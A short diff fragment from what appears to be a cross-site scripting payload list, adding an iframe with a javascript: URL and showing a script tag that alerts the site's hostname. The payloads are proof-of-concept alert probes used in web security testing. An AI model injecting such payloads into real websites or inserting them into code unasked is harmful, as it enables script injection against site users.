@@ -42,7 +42,11 @@ perfect xss payload stored and reflected and dom and some change in the page
 <code>
 <script>alert('cuurnnt url: ' + window.location.hostname)</script> (show the website ip) reflected
   <pre class="notranslate"><code>&lt;!-- Project Name  : Cross Site Scripting ( XSS ) Vulnerability Payload List --&gt;
-&lt;!--        Author : Ismail Tasdelen --&gt;
+
+  <iframe src="javascript:alert(`xss`)"> 
+
+  
+    &lt;!--        Author : Ismail Tasdelen --&gt;
 &lt;!--      Linkedin : https://www.linkedin.com/in/ismailtasdelen/ --&gt;
 &lt;!--        GitHub : https://github.com/ismailtasdelen/ --&gt;
 &lt;!--       Twitter : https://twitter.com/ismailtsdln --&gt;
